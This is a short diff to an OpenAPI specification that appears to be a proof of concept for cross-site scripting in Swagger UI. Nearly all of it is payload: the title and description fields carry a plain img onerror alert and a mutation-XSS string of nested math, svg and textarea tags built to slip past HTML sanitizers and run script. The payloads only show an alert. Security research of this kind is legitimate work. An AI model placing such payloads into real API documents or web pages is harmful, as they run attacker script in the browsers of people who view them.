@@ -1,8 +1,8 @@
 openapi: 3.0.n
 info:
-  title: AbdulRahman<img src=x onerror=alert(1)>
+  title: <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
+    AbdulRahman Swagger XSS PoC
 paths:
   /accounts:
     get:
